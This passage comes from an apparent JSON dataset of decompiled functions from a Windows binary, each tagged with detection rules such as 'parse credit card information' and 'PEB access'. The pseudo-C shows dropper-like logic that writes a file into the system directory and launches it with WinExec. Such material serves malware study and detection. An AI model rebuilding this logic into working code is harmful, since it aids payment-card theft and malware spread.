extraout_EDX_03 + 0x14;\n    uVar20 = *puVar6 < uVar16;\n    uVar24 = SBORROW4(*puVar6, uVar16);\n    uVar22 = *puVar6 == uVar16;\n    while( true ) {\n        fcn.00402f20();\n        uStack1 = 10;\n        fcn.00402f20();\n        if ((uVar20 || uVar22) || (!uVar20 && !uVar22)) break;\n        if (!uVar24) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n        puVar8 = extraout_EDX_04 + 0xf;\n        uVar20 = CARRY1(*puVar8, extraout_CH_01);\n        uVar24 = SCARRY1(*puVar8, extraout_CH_01);\n        *puVar8 = *puVar8 + extraout_CH_01;\n        uVar22 = *puVar8 == 0;\n    }\n    uStack1 = 10;\n    uStack5 = 0xc;\n    uStack4 = 0x72;\n    uStack3 = 0x40;\n    uStack9 = 0xf;\n    uStack8 = 0;\n    uStack7 = 0;\n    uStack6 = 0;\n    uStack13 = 0x407490;\n    uStack17 = 0x3f;\n    uStack16 = 0x4019;\n    uStack14 = 0;\n    iVar14 = fcn.00402f20();\n    iVar14 = extraout_ECX_04 - iVar14;\n    uVar10 = iVar14 & 0xff00 | iVar14 ^ iVar14 >> 8 | 0x3d00 | puVar15;\n    bVar21 = SBORROW1(uVar10 >> 8, uVar10);\n    uStack0000002f = 4;\n    uStack00000027 = 0xf;\n    uStack0000002a = 0;\n    puStack00000023 = 0x407490;\n    uStack0000001f = 0x74;\n    uStack00000022 = 0;\n    fcn.00402f20();\n    if ((!bVar21) && (bVar21)) {\n        *puStack00000023 = uStack0000003f;\n        return;\n    }\n    uStack0000001f = 5;\n    uStack00000022 = 0;\n    fcn.00402f20();\n    if ((!bVar21) && (bVar21)) {\n        *0x407490 = uStack0000002f;\n        return;\n    }\n    uStack1 = 0xda;\n    fcn.00402f20();\n    uStack1 = 0x2a;\n    uStack5 = 0x58;\n    uStack4 = 0x72;\n    uStack3 = 0x40;\n    uStack9 = 0xf;\n    uStack8 = 0;\n    uStack7 = 0;\n    uStack6 = 0;\n    uStack13 = 0x407490;\n    uStack17 = 0xf9;\n    uStack16 = 0x4019;\n    uStack14 = 0;\n    fcn.00402f20();\n    uStack0000002f = 0xb;\n    uStack00000027 = 0xf;\n    uStack0000002a = 0;\n    puStack00000023 = 0x407490;\n    uStack0000001f = 0x24;\n    uStack00000022 = 0;\n    fcn.00402f20();\n    return;\n}\n",
        "token_count": 5839
    },
    "00402c50": {
        "rules": [
            "parse credit card information/330c87771d2c420b9aab664e2b442302",
            "parse credit card information/330c87771d2c420b9aab664e2b442302"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402cff) overlaps instruction at (ram,0x00402cfb)\n// \n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Removing unreachable block (ram,0x00402d6f)\n\nvoid fcn.00402c50(uint param_1, uint param_2, uint param_3, int32_t param_4, uint32_t param_5, uint *param_6, \n                 uint *param_7)\n\n{\n    uint8_t *puVar1;\n    char cVar2;\n    code *pcVar3;\n    uint8_t uVar4;\n    uint *puVar5;\n    char *pcVar6;\n    int32_t iVar7;\n    uint8_t extraout_CH;\n    int32_t extraout_ECX;\n    uint extraout_ECX_00;\n    uint extraout_ECX_01;\n    uint extraout_ECX_02;\n    uint8_t extraout_DL;\n    uint32_t uVar8;\n    uint *puVar9;\n    uchar *puVar10;\n    int32_t iVar11;\n    bool bVar12;\n    bool bVar13;\n    ulong uVar14;\n    uchar auStackY512 [192];\n    uint *puStackY320;\n    int32_t iStackY316;\n    uint uStackY312;\n    uint *puStackY308;\n    \n    if ((0x10b < &stack0xfffffffc && *0x10 != 0x110) && (0x10b >= &stack0xfffffffc || *0x10 == 0x110)) {\n        do {\n    // WARNING: Do nothing block with infinite loop\n        } while( true );\n    }\n    puStackY308 = 0x402c80;\n    fcn.00402df0(param_5, param_6, param_1, 0x20, param_7 + 8);\n    puStackY308 = 0x402cb9;\n    uVar4 = fcn.00402df0(param_5, param_6, param_2, 0x20, param_7 + 0x18);\n    bVar12 = false;\n    bVar13 = (extraout_CH & uVar4) == 6;\n    puStackY308 = 0x402ce5;\n    puVar5 = fcn.00402df0(param_5, param_6, param_3, 0x20, param_7 + 0x28);\n    if ((bVar12 || bVar13) || (param_5 = param_5 & 0xffff00ff,  iVar7 = extraout_ECX,  !bVar12 && !bVar13)) {\n        iStackY316 = param_4;\n        puVar5 = param_7 + 0x38;\n        uStackY312 = 0x20;\n        iVar7 = param_4;\n        puStackY320 = param_6;\n        puStackY308 = puVar5;\n    }\n    *param_6 = *param_7;\n    uVar8 = param_5 & 0xffff0000 | CONCAT11(0xdf, param_5);\n    cVar2 = &stack0xfffffe00 >> 8;\n    pcVar6 = &stack0xfffffe00 & 0xffff0000 | CONCAT11(0x4d, cVar2);\n    *pcVar6 = *pcVar6 + cVar2;\n    pcVar6[0x6a] = pcVar6[0x6a] + extraout_DL;\n    *(iVar7 + 0x57) = *(iVar7 + 0x57) & extraout_DL;\n    puVar5[-1] = uVar8;\n    puVar5[-2] = 0x402d13;\n    fcn.00402df0(puVar5[-1], *puVar5, puVar5[1], puVar5[2], puVar5[3]);\n    puVar9 = puVar5 + 9;\n    puVar5[8] = extraout_ECX_00;\n    puVar5[8] = 0x402d28;\n    iVar7 = fcn.00402c00();\n    pcVar3 = _sym.imp.MSVCRT.dll_rand;\n    if (iVar7 == -1) {\n        puVar9 = puVar5 + 8;\n        puVar5[8] = 0x402d3b;\n        iVar7 = (*pcVar3)();\n        *(param_7 + 0x49) = iVar7 % 5;\n    }\n    else {\n        *(param_7 + 0x49) = iVar7;\n    }\n    *0x8be180c3 = 0;\n    puVar5 = 0x8be180c4;\n    for (iVar7 = 0x40; iVar7 != 0; iVar7 = iVar7 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *0x8be181cb = 0x104;\n    *(puVar5 + 2) = 0;\n    *(puVar9 + -4) = 0x8be181cb;\n    *(puVar9 + -8) = 0x8be180c3;\n    *(puVar9 + -0xc) = 0x8be181c7;\n    *(puVar9 + -0x10) = 0x407284;\n    *(puVar9 + -0x14) = 0x407258;\n    *(puVar9 + -0x18) = 0x80000001;\n    *(puVar9 + -0x1c) = 0x402d9c;\n    uVar14 = fcn.00402140(*(puVar9 + -0x18), *(puVar9 + -0x14), *(puVar9 + -0x10), *(puVar9 + -0xc), *(puVar9 + -8), \n                          *(puVar9 + -4));\n    if (uVar14 != 0) {\n        *(puVar9 + -4) = uVar14;\n        *(puVar9 + -8) = extraout_ECX_01;\n        *(puVar9 + -0xc) = uVar14 >> 0x20;\n        *(puVar9 + -0x10) = uVar8;\n        *(puVar9 + -0x14) = puVar9;\n        *(puVar9 + -0x18) = 0x8be181cf;\n        *(puVar9 + -0x1c) = param_7 + 1;\n        *(puVar9 + -0x20) = puVar5 + 3;\n        iVar11 = *(puVar9 + -0x18);\n        *(puVar9 + -4) = 0x4072d4;\n        *(puVar9 + -8) = iVar11 + -0x10c;\n        pcVar3 = _sym.imp.MSVCRT.dll__stricmp;\n        puVar10 = puVar9 + -0xc;\n        *(puVar9 + -0xc) = 0x402dbd;\n        iVar7 = (*pcVar3)();\n        if (iVar7 == 0) {\n            *(puVar10 + 4) = extraout_ECX_02;\n            puVar1 = *(iVar11 + 0x20) + 0x120;\n            *puVar1 = *puVar1 | 0x80;\n        }\n    }\n    return;\n}\n",
        "token_count": 1671
    },
    "004022d0": {
        "rules": [
            "parse credit card information/562ff391f55141bc9728340148e50ea1"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.004022d0(uint *hObject, uint arg_ch, uint arg_10h)\n\n{\n    int32_t arg_8h;\n    int32_t iVar1;\n    uint unaff_EDI;\n    uint var_4h;\n    \n    *0x4235e4 = fcn.00403af0();\n    arg_8h = (*_sym.imp.KERNEL32.dll_CreateFileA)(hObject, 0x40000000, 1, 0, 2, 0x80, 0);\n    if (arg_8h == -1) {\n        return 0;\n    }\n    if ((!SBORROW4(arg_8h, -1)) && (SBORROW4(arg_8h, -1))) {\n        *hObject = unaff_EDI;\n        return unaff_EDI;\n    }\n    iVar1 = (*_sym.imp.KERNEL32.dll_WriteFile)(arg_8h, arg_ch, arg_10h, &var_4h, 0);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    if (*0x4235e4 != 0) {\n        iVar1 = fcn.00402210(arg_8h);\n        *0x4235e4 = iVar1 == 0;\n    }\n    fcn.00403070(0, arg_8h);\n    if (*0x4235e4 == 0) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(arg_8h);\n    }\n    return 1;\n}\n",
        "token_count": 357
    },
    "00403360": {
        "rules": [
            "parse credit card information/562ff391f55141bc9728340148e50ea1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_20fh\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00403360(uint arg_8h)\n\n{\n    ushort uVar1;\n    int32_t iVar2;\n    int32_t extraout_ECX;\n    char cVar3;\n    uint in_EDX;\n    uint extraout_EDX;\n    uint unaff_EBX;\n    uint *puVar4;\n    uchar uVar5;\n    char cVar6;\n    char cVar7;\n    uchar uStack533;\n    uchar lpBuffer;\n    uint var_20fh;\n    uchar s;\n    uint var_10bh;\n    uint var_8h;\n    uint var_4h;\n    \n    uStack533 = unaff_EBX >> 0x18;\n    while( true ) {\n        puVar4 = &fcn.00403360::var_20fh;\n        for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n            *puVar4 = 0;\n            puVar4 = puVar4 + 1;\n        }\n        *puVar4 = 0;\n        *(puVar4 + 2) = 0;\n        s = 0;\n        puVar4 = &fcn.00403360::var_10bh;\n        for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n            *puVar4 = 0;\n            puVar4 = puVar4 + 1;\n        }\n        *puVar4 = 0;\n        *(puVar4 + 2) = 0;\n        cVar3 = in_EDX >> 8;\n        cVar7 = SBORROW1(cVar3, '6');\n        cVar6 = cVar3 + -0x36 < '\\0';\n        uVar5 = cVar3 == '6';\n        (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(&stack0xfffffdec, 4);\n        (*_sym.imp.MSVCRT.dll_sprintf)(&stack0xfffffef0, 0x407024, &stack0xfffffdec, arg_8h);\n        if ((uVar5 || cVar7 != cVar6) || (!uVar5 && cVar7 == cVar6)) break;\n        in_EDX = extraout_EDX;\n        if (extraout_ECX != 0) {\n            do {\n    // WARNING: Do nothing block with infinite loop\n            } while( true );\n        }\n    }\n    uVar1 = fcn.00403a70();\n    var_20fh._1_1_ = uVar1;\n    stack0xfffffdef = CONCAT31(0x40342c, uVar1 >> 8);\n    fcn.00403490(var_4h);\n    _lpBuffer = &stack0xfffffef0 >> 8;\n    var_20fh._1_1_ = &stack0xfffffef0 >> 0x18;\n    iVar2 = fcn.004022d0(&stack0xfffffef0, var_4h, var_8h);\n    if (iVar2 != 0) {\n        _lpBuffer = unaff_EBX >> 8;\n        stack0xfffffdef = 0x40347b;\n        var_20fh._1_1_ = uStack533;\n        fcn.00403070();\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 768
    },
    "00403710": {
        "rules": [
            "parse credit card information/562ff391f55141bc9728340148e50ea1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00403834) overlaps instruction at (ram,0x00403833)\n// \n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nvoid __cdecl fcn.00403710(uint32_t arg_8h, int32_t arg_ch, uint32_t *arg_10h, uint32_t *arg_14h)\n\n{\n    uint16_t uVar1;\n    uint32_t uVar2;\n    uint16_t uVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    int32_t unaff_EBX;\n    uchar *unaff_EBP;\n    uint32_t unaff_ESI;\n    uint unaff_EDI;\n    bool bVar7;\n    ulong uVar8;\n    uint var_8h;\n    uint var_4h;\n    uchar **ppuStack4;\n    \n    ppuStack4 = unaff_EBP;\n    while( true ) {\n        uVar2 = fcn.00402a80(0, arg_8h, arg_ch + 1U >> 1, unaff_EDI, unaff_ESI, unaff_EBX);\n        uVar2 = uVar2 & 0xffff;\n        uVar8 = (*_sym.imp.dbghelp.dll_ImageNtHeader)(arg_8h);\n        uVar6 = uVar8 >> 0x20;\n        uVar4 = *(uVar8 + 0x58);\n        arg_8h._0_2_ = uVar2;\n        if (arg_8h < uVar4) {\n            uVar6 = (uVar2 - uVar4 & 0xffff) - 1;\n            unaff_ESI = uVar4;\n            arg_8h = uVar6;\n        }\n        else {\n            uVar4 = uVar2 - (uVar4 & 0xffff);\n            unaff_ESI = arg_8h;\n            arg_8h = uVar4;\n        }\n        uVar1 = uVar4 >> 0x10;\n        uVar3 = arg_8h;\n        if (uVar1 <= uVar3) break;\n        if ((uVar3 <= uVar1) || (uVar1 < uVar3)) {\n            iVar5 = (arg_8h - (uVar4 >> 0x10) & 0xffff) - 1;\n            goto code_r0x00403808;\n        }\n        ppuStack4 = &ppuStack4;\n        if (arg_8h != 0) {\n            do {\n    // WARNING: Do nothing block with infinite loop\n            } while( true );\n        }\n    }\n    iVar5 = arg_8h - (uVar4 >> 0x10);\ncode_r0x00403808:\n    uVar4 = iVar5 + arg_ch;\n    bVar7 = (POPCOUNT(uVar4 & 0xff) & 1U) == 0;\n    *arg_14h = uVar4;\n    if ((bVar7) || (!bVar7)) {\n        uVar4 = uVar6;\n        arg_14h = arg_10h;\n    }\n    *(unaff_EBX + 0x558bf845) = *(unaff_EBX + 0x558bf845) | 0x10;\n    *arg_14h = *(uVar4 + 0x58);\n    return;\n}\n",
        "token_count": 758
    },
    "00401df0": {
        "rules": [
            "parse credit card information/0fcc6283562247e58776c7b51a92f681",
            "parse credit card information/0fcc6283562247e58776c7b51a92f681",
            "parse credit card information/0fcc6283562247e58776c7b51a92f681",
            "parse credit card information/0fcc6283562247e58776c7b51a92f681"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401fd8) overlaps instruction at (ram,0x00401fd4)\n// \n// WARNING: Removing unreachable block (ram,0x00401eca)\n\nvoid __fastcall fcn.00401df0(uchar *param_1)\n\n{\n    int32_t *piVar1;\n    char *pcVar2;\n    uint8_t uVar3;\n    uint32_t in_EAX;\n    uint32_t uVar4;\n    uint32_t extraout_ECX;\n    uchar *extraout_ECX_00;\n    int32_t extraout_ECX_01;\n    uint8_t extraout_DL;\n    ushort extraout_DX;\n    int32_t extraout_EDX;\n    int32_t iVar5;\n    int32_t extraout_EDX_00;\n    uint32_t unaff_EBX;\n    int32_t unaff_EBP;\n    uchar *unaff_ESI;\n    uchar *puVar6;\n    uint *unaff_EDI;\n    uint *puVar7;\n    bool in_CF;\n    uchar uVar8;\n    uint8_t in_AF;\n    bool in_ZF;\n    bool bVar9;\n    char cVar10;\n    bool bVar11;\n    uint uVar12;\n    ushort in_stack_ffffffec;\n    ushort uStack18;\n    \n    if ((in_ZF) || (!in_ZF)) {\ncode_r0x00401e07:\n        uVar4 = fcn.00402f20(0x407490, 0xf, 0x738c, 0x20);\n        in_CF = uVar4 < extraout_ECX;\n        bVar11 = SBORROW4(uVar4, extraout_ECX);\n        bVar9 = uVar4 == extraout_ECX;\n        in_stack_ffffffec = 0x73ac;\n        uStack18 = 0x40;\n        fcn.00402f20(0x407490, 0xf, 0x73ac, 0x26);\n        param_1 = extraout_ECX_00;\n        iVar5 = extraout_EDX;\n        if ((!bVar11) && (bVar11)) {\n            puVar7 = unaff_EDI + 1;\n            uVar8 = in(extraout_EDX);\n            *unaff_EDI = uVar8;\n            unaff_EBX = CONCAT31(unaff_EBX >> 8, 0xbc);\n            if (!in_CF && !bVar9) goto code_r0x00401f0a;\n            goto code_r0x00401e57;\n        }\ncode_r0x00401e60:\n        *(iVar5 + 0xf) = *(iVar5 + 0xf) + (param_1 >> 8);\n        fcn.00402f20(0x407490);\n        fcn.00402f20(0x407490, 0xf, 0x73dc, 0x19);\n        in_stack_ffffffec = SUB42(unaff_ESI, 0);\n        uStack18 = unaff_ESI >> 0x10;\n        puVar7 = unaff_EDI;\n    }\n    else {\n        unaff_EBX = unaff_EBX + 1;\n        if (!in_CF && unaff_EBX != 0) {\n            uVar3 = 9 < (in_EAX & 0xf) | in_AF;\n            piVar1 = (in_EAX & 0xffff0000 | CONCAT11((in_EAX >> 8) + uVar3, in_EAX + uVar3 * '\\x06') & 0xff0f) + 0x2a;\n            *piVar1 = *piVar1 - unaff_EBX;\n            unaff_ESI = unaff_ESI + 1;\n            goto code_r0x00401e07;\n        }\n        iVar5 = unaff_EBP + 0x566a8095;\n        puVar7 = unaff_EDI;\ncode_r0x00401e57:\n        unaff_EDI = puVar7;\n        if (in_CF) goto code_r0x00401e60;\n        pcVar2 = (unaff_EBX & 0xffff0000 | CONCAT11(*param_1, unaff_EBX)) + 0x565110c4;\n        *pcVar2 = *pcVar2 + 'j';\n    }\n    unaff_ESI = CONCAT22(uStack18, in_stack_ffffffec);\n    fcn.00402f20(0x407490, 0xf, 0x73f8, 0xb);\n    fcn.00402f20(0x407490, 0xf, 0x7404, 0x12);\n    iVar5 = extraout_EDX_00;\ncode_r0x00401f0a:\n    bVar9 = iVar5 < 0x51;\n    bVar11 = iVar5 == 0x51;\n    fcn.00402f20(0x407490, 0xf, 0x7418, 0x12);\n    if ((!bVar9 && !bVar11) && (bVar9 || bVar11)) {\n        do {\n    // WARNING: Do nothing block with infinite loop\n        } while( true );\n    }\n    fcn.00402f20(0x407490, 0xf, 0x40742c, 2);\n    puVar6 = unaff_ESI;\n    if ((!bVar11) && (bVar11)) {\n        puVar6 = unaff_ESI + 1;\n        out(*unaff_ESI, extraout_DX);\n    }\n    fcn.00402f20(0x407490, 0xf, 0x407430, 8);\n    uVar12 = 0x407490;\n    fcn.00402f20(0x407490, 0xf, 0x7438, 8);\n    uVar8 = extraout_DL < 0x51;\n    cVar10 = extraout_DL == 0x51;\n    do {\n        fcn.00402f20(uVar12, 0xf, 0x7440, 0x7490);\n        if ((uVar8) || (!uVar8)) goto code_r0x00401fda;\n    } while (extraout_ECX_01 != 1 && cVar10 != '\\0');\n    *puVar7 = puVar6 + 4;\ncode_r0x00401fda:\n    fcn.00402f20(0x407490, 0xf, 0x407448);\n    fcn.00402f20(0x7490, 0xf);\n    fcn.00402f20(0x407490, 0xf, 0x407458, 6);\n    fcn.00402f20(0x7490, 0xf);\n    fcn.00402f20(0x7490, 0xf);\n    return;\n}\n",
        "token_count": 1531
    },
    "00404720": {
        "rules": [
            "parse credit card information/0fcc6283562247e58776c7b51a92f681",
            "parse credit card information/0fcc6283562247e58776c7b51a92f681"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x0040484a) overlaps instruction at (ram,0x00404849)\n// \n// WARNING: Removing unreachable block (ram,0x00404767)\n// WARNING: Removing unreachable block (ram,0x0040476d)\n// WARNING: Removing unreachable block (ram,0x0040480b)\n// WARNING: Removing unreachable block (ram,0x00404818)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nchar * __cdecl fcn.00404720(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    char cVar1;\n    uchar **ppuVar2;\n    uint32_t uVar3;\n    char *pcVar4;\n    int32_t iVar5;\n    uint *puVar6;\n    uint unaff_EDI;\n    uint *puVar7;\n    bool bVar8;\n    uchar *puStack555;\n    uint uStack551;\n    unkbyte3 Stack547;\n    uchar lpBuffer;\n    uint var_213h;\n    uchar s;\n    uint var_10fh;\n    char *var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puVar6 = &stack0xfffffffc;\n    Stack547 = unaff_EDI >> 8;\n    lpBuffer = 0;\n    puVar7 = &var_213h;\n    for (iVar5 = 0x40; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    *(puVar7 + 2) = 0;\n    s = 0;\n    puVar7 = &var_10fh;\n    for (iVar5 = 0x40; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    var_ch = 0x1;\n    *(puVar7 + 2) = 0;\n    puStack555 = &lpBuffer;\n    uStack551 = 0x104;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)();\n    (*_sym.imp.MSVCRT.dll_sprintf)(&s, 0x407030);\n    fcn.004026e0(&var_4h, &var_8h);\n    iVar5 = fcn.004031f0(arg_8h, arg_ch, arg_10h, arg_14h);\n    if (iVar5 == 0) {\n        return NULL;\n    }\n    uVar3 = fcn.004022d0(&s, var_4h, var_8h);\n    bVar8 = (POPCOUNT(uVar3 & 0xff) & 1U) != 0;\n    if (uVar3 == 0) {\n        return NULL;\n    }\n    if ((bVar8) && (!bVar8)) {\n        *(uVar3 + 0x57) = *(uVar3 + 0x57) + -9;\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    fcn.00402870();\n    iVar5 = fcn.00402b20(0x407068);\n    if (iVar5 == -1) {\n        iVar5 = fcn.00402b20(0x40705c);\n        uVar3 = iVar5 + 1;\n        if (uVar3 == 0) goto code_r0x004048e9;\n    }\n    iVar5 = fcn.00402a40(arg_8h);\n    if (iVar5 != 0) {\n        fcn.00404b60();\n        fcn.00402130();\n        return 0x1;\n    }\n    uVar3 = *0x4235e4;\n    if (*0x4235e4 == 0) {\n        return NULL;\n    }\ncode_r0x004048e9:\n    bVar8 = (POPCOUNT(uVar3 & 0xff) & 1U) != 0;\n    if ((bVar8) && (!bVar8)) {\n        puVar7 = &stack0xfffffdd1;\n        cVar1 = '\\x1e';\n        do {\n            puVar6 = puVar6 + -1;\n            puVar7 = puVar7 + -1;\n            *puVar7 = *puVar6;\n            cVar1 = cVar1 + -1;\n        } while ('\\0' < cVar1);\n        pcVar4 = in(0x78);\n        return pcVar4;\n    }\n    pcVar4 = fcn.00404e10(arg_8h, &s);\n    if (pcVar4 == NULL) {\n        var_ch = pcVar4;\n    }\n    if ((var_ch != NULL) && (pcVar4 = fcn.00403be0(arg_8h),  pcVar4 == NULL)) {\n        var_ch = pcVar4;\n    }\n    if (var_ch == NULL) {\n        var_ch = fcn.004010d0();\n    }\n    pcVar4 = var_ch;\n    ppuVar2 = var_ch;\n    if (var_ch != NULL) {\n        pcVar4 = fcn.00402130();\n        ppuVar2 = &puStack555;\n    }\n    bVar8 = (POPCOUNT(ppuVar2 & 0xff) & 1U) != 0;\n    if ((bVar8) && (!bVar8)) {\n        *(pcVar4 + -0x18) = *(pcVar4 + -0x18) + -3;\n        *pcVar4 = *pcVar4 + pcVar4;\n    }\n    (*_sym.imp.KERNEL32.dll_Sleep)();\n    (*_sym.imp.KERNEL32.dll_WinExec)(0x40707c);\n    return var_ch;\n}\n",
        "token_count": 1339
    },
    "00401a30": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00401c01) overlaps instruction at (ram,0x00401bfc)\n// \n// WARNING: Removing unreachable block (ram,0x00401eca)\n// WARNING: Removing unreachable block (ram,0x00401dff)\n// WARNING: Removing unreachable block (ram,0x00401e4c)\n// WARNING: Removing unreachable block (ram,0x00401da0)\n// WARNING: Removing unreachable block (ram,0x00401da2)\n// WARNING: Removing unreachable block (ram,0x00401df0)\n// WARNING: Removing unreachable block (ram,0x00401df9)\n// WARNING: Removing unreachable block (ram,0x00401e02)\n// WARNING: Removing unreachable block (ram,0x00401e07)\n// WARNING: Removing unreachable block (ram,0x00401e3c)\n// WARNING: Removing unreachable block (ram,0x00401e5a)\n// WARNING: Removing unreachable block (ram,0x00401e4a)\n// WARNING: Removing unreachable block (ram,0x00401e4f)\n// WARNING: Removing unreachable block (ram,0x00401e57)\n// WARNING: Removing unreachable block (ram,0x00401ea0)\n// WARNING: Removing unreachable block (ram,0x00401e60)\n// WARNING: Removing unreachable block (ram,0x00401ea6)\n// WARNING: Removing unreachable block (ram,0x00401ec5)\n// WARNING: Removing unreachable block (ram,0x00401f0a)\n// WARNING: Removing unreachable block (ram,0x00401f2d)\n// WARNING: Removing unreachable block (ram,0x00401f31)\n// WARNING: Removing unreachable block (ram,0x00401f32)\n// WARNING: Removing unreachable block (ram,0x00401f35)\n// WARNING: Removing unreachable block (ram,0x00401f4e)\n// WARNING: Removing unreachable block (ram,0x00401f5a)\n// WARNING: Removing unreachable block (ram,0x00401f60)\n// WARNING: Removing unreachable block (ram,0x00401fae)\n// WARNING: Removing unreachable block (ram,0x00401fc1)\n// WARNING: Removing unreachable block (ram,0x00401fd8)\n// WARNING: Removing unreachable block (ram,0x00401fc9)\n// WARNING: Removing unreachable block (ram,0x00401fcb)\n// WARNING: Removing unreachable block (ram,0x00401fda)\n// WARNING: Removing unreachable block (ram,0x00402029)\n// WARNING: Removing unreachable block (ram,0x00402035)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nvoid fcn.00401a30(uint param_1, uint param_2, ulong param_3)\n\n{\n    char *pcVar1;\n    uint8_t *puVar2;\n    uint32_t uVar3;\n    uint32_t *puVar4;\n    uint8_t uVar5;\n    uint8_t extraout_AH;\n    uint8_t extraout_AH_00;\n    char extraout_CH;\n    uint8_t uVar10;\n    ushort extraout_CX;\n    uint16_t uVar8;\n    uint extraout_ECX;\n    uint extraout_ECX_00;\n    uint uVar9;\n    uint extraout_ECX_01;\n    char extraout_CH_00;\n    int32_t extraout_ECX_02;\n    char extraout_DL;\n    ushort extraout_DX;\n    int32_t extraout_EDX;\n    int32_t extraout_EDX_00;\n    uint8_t uVar11;\n    uint unaff_EBX;\n    int32_t unaff_EBP;\n    int32_t *unaff_ESI;\n    uint32_t unaff_EDI;\n    int32_t *piVar12;\n    int32_t *piVar13;\n    ushort in_SS;\n    uchar uVar14;\n    uchar uVar15;\n    uchar uVar16;\n    bool bVar17;\n    char cVar18;\n    bool bVar19;\n    uchar uVar20;\n    float10 fVar21;\n    uint16_t uStack46;\n    ushort uStack24;\n    ushort uStack22;\n    ushort uStack20;\n    uchar uStack18;\n    uint8_t uStack17;\n    ushort uStack16;\n    ushort uStack14;\n    ushort uStack12;\n    ushort uStack10;\n    ushort uStack8;\n    ushort uStack6;\n    ushort uStack4;\n    ushort uStack2;\n    uint8_t uVar6;\n    int32_t *piVar7;\n    \n    uStack4 = unaff_EBX;\n    uStack2 = unaff_EBX >> 0x10;\n    uStack8 = SUB42(unaff_ESI, 0);\n    uStack6 = unaff_ESI >> 0x10;\n    uStack12 = unaff_EDI;\n    uStack10 = unaff_EDI >> 0x10;\n    uStack16 = 0x11;\n    uStack14 = 0;\n    uStack20 = 0x7010;\n    uStack18 = 0x40;\n    uStack17 = 0;\n    uStack24 = 0xf;\n    uStack22 = 0;\n    fcn.00402f20();\n    uStack16 = 0xf;\n    uStack14 = 0;\n    uStack20 = 0x722c;\n    uStack18 = 0x40;\n    uStack17 = 0;\n    uStack24 = 0xf;\n    uStack22 = 0;\n    fcn.00402f20();\n    uStack16 = 0x1a;\n    uStack14 = 0;\n    uStack20 = 0x723c;\n    uStack18 = 0x40;\n    uStack17 = 0;\n    uStack24 = 0xf;\n    uStack22 = 0;\n    fcn.00402f20();\n    uStack16 = 10;\n    uStack14 = 0;\n    uStack20 = 0x7290;\n    uStack18 = 0x40;\n    uStack17 = 0;\n    uStack24 = 0xf;\n    uStack22 = 0;\n    fcn.00402f20();\n    uStack16 = 0xb;\n    uStack14 = 0;\n    uStack20 = 0x729c;\n    uStack18 = 0x40;\n    uStack17 = 0;\n    uStack24 = 0xf;\n    uStack22 = 0;\n    fcn.00402f20();\n    uStack16 = 8;\n    uStack14 = 0;\n    uStack20 = 0x72a8;\n    uStack18 = 0x40;\n    uStack17 = 0;\n    uStack24 = 0xf;\n    uStack22 = 0;\n    fcn.00402f20();\n    piVar12 = unaff_EDI ^ *(unaff_EDI + 0xe58be73);\n    uVar3 = unaff_EBP + 0x68096a76;\n    pcVar1 = extraout_EDX + 0xf;\n    *pcVar1 = *pcVar1 + extraout_CH;\n    bVar19 = *pcVar1 < '\\0';\n    fVar21 = fcn.00402f20();\n    piVar13 = piVar12;\n    if (bVar19) goto code_r0x00401b87;\ncode_r0x00401b78:\n    piVar13 = piVar12;\n    if (bVar19) {\n        *(piVar12 + 7) = fVar21;\n        piVar13 = piVar12 + 5;\n        unaff_ESI = unaff_ESI + 5;\n    }\ncode_r0x00401b87:\n    fcn.00402f20();\n    uStack17 = extraout_CX >> 8;\n    uVar11 = uVar3 >> 8;\n    uVar14 = 0;\n    uVar20 = 0;\n    uVar8 = CONCAT11(uStack17 & uVar11, extraout_CX | uVar3) & piVar13;\n    uVar16 = uVar8 == 0;\n    uVar15 = (POPCOUNT(uVar8 & 0xff) & 1U) == 0;\n    uStack16 = 9;\n    uStack14 = 0;\n    uStack20 = 0x72c8;\n    uStack18 = 0x40;\n    uStack17 = 0;\n    uStack24 = 0xf;\n    uStack22 = 0;\n    fVar21 = fcn.00402f20();\n    uVar9 = extraout_ECX;\n    if (uVar15) goto code_r0x00401be9;\n    do {\n        if (uVar15) {\n            puVar4 = segment(in_SS, *0x10 + -0x1c);\n            if (uVar14) goto code_r0x00401c0a;\n            if (uVar15) break;\n            uVar14 = 0;\n            uVar20 = 0;\n            uVar16 = *0x10 == 0x18;\n            uVar15 = (POPCOUNT(&uStack24 & 0xff) & 1U) == 0;\n        }\ncode_r0x00401be9:\n        fVar21 = fcn.00402f20();\n        if (uVar14 || uVar16) goto code_r0x00401c1e;\n        uStack46 = unaff_ESI;\n        uVar9 = extraout_ECX_00;\n        while( true ) {\n            